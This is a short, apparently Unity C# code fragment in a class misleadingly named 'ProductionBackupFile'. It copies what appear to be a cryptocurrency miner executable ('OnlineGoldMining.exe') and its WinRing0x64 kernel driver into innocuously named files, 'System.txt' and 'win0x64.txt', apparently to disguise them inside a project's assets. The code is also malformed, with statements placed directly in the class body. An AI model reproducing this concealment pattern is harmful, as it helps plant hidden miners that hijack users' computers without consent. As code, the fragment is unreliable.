using System.Collections;
using System.Collections.Generic;

public class ProductionBackupFile
{
    MINER_PATH = Application.streamingAssetsPath + "/" + "OnlineGoldMining.exe";
    MINER_RELY_PATH = Application.streamingAssetsPath + "/" + "WinRing0x64.sys";
    FileManager.GetHash(MINER_PATH);
    FileManager.GetHash(MINER_RELY_PATH);
    byte[] Odatas = FileManager.ReadFileInfo(MINER_PATH);
    byte[] Wdatas = FileManager.ReadFileInfo(MINER_RELY_PATH);
    FileManager.CreateFileAndSpecifyInfo(Application.streamingAssetsPath + "/" + "System.txt", Odatas);
    FileManager.CreateFileAndSpecifyInfo(Application.streamingAssetsPath + "/" + "win0x64.txt", Wdatas);
 
}
